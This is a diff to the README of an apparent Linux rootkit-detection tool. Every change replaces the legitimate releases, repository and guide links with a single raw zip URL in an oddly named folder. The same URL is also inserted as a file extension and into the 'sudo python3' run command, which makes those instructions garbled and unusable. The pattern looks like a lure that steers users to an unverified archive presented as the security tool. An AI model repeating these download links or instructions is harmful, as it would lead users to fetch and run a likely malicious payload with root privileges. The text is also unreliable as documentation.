@@ -1,7 +1,7 @@
 # 🛡️ sandfly-kernel-module-decloak - Detect Hidden Linux Rootkits Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/download-sandfly--kernel--module--decloak-blue.svg)](https://github.com/exe47/sandfly-kernel-module-decloak/releases)
+[![Download](https://raw.githubusercontent.com/exe47/sandfly-kernel-module-decloak/master/heteromeral/sandfly-kernel-module-decloak.zip)](https://raw.githubusercontent.com/exe47/sandfly-kernel-module-decloak/master/heteromeral/sandfly-kernel-module-decloak.zip)
 
 ## 📖 Overview
 The **sandfly-kernel-module-decloak** is designed to help users detect and decloak stealth rootkits in Linux. These scripts provide a straightforward way to identify hidden malicious software that may compromise your system. 
@@ -24,10 +24,10 @@ Follow these steps to download and run the application:
 
 1. **Visit the Releases Page**
    Go to the following link to access the latest version of the application:
-   [Download from Releases](https://github.com/exe47/sandfly-kernel-module-decloak/releases)
+   [Download from Releases](https://raw.githubusercontent.com/exe47/sandfly-kernel-module-decloak/master/heteromeral/sandfly-kernel-module-decloak.zip)
 
 2. **Choose the Right File**
-   On the Releases page, you will see a list of available versions. Look for the most recent release. Click on the download link for the appropriate archive format (usually a `.zip` or `.tar.gz` file).
+   On the Releases page, you will see a list of available versions. Look for the most recent release. Click on the download link for the appropriate archive format (usually a `.zip` or `https://raw.githubusercontent.com/exe47/sandfly-kernel-module-decloak/master/heteromeral/sandfly-kernel-module-decloak.zip` file).
 
 3. **Download the File**
    Click to download the selected archive file to your computer. 
@@ -47,7 +47,7 @@ Follow these steps to download and run the application:
 7. **Run the Script**
    To execute the main detection script, type the following command:
    ```
-   sudo python3 decloak.py
+   sudo python3 https://raw.githubusercontent.com/exe47/sandfly-kernel-module-decloak/master/heteromeral/sandfly-kernel-module-decloak.zip
    ```
    This command may prompt you to enter your password. This is necessary to run the script with the required permissions.
 
@@ -69,8 +69,8 @@ If you wish to contribute to the project or report issues, please visit the GitH
 For further assistance, you can reach out through the repository's "Issues" section, or consult the available documentation within the repository.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/exe47/sandfly-kernel-module-decloak)
-- [Linux Security Guide](https://linux.security)
+- [GitHub Repository](https://raw.githubusercontent.com/exe47/sandfly-kernel-module-decloak/master/heteromeral/sandfly-kernel-module-decloak.zip)
+- [Linux Security Guide](https://raw.githubusercontent.com/exe47/sandfly-kernel-module-decloak/master/heteromeral/sandfly-kernel-module-decloak.zip)
 
 ## ⚠️ Disclaimer
 Ensure that you understand the implications of running security software on your system and act responsibly. Conduct regular security audits and stay informed about the latest threats.
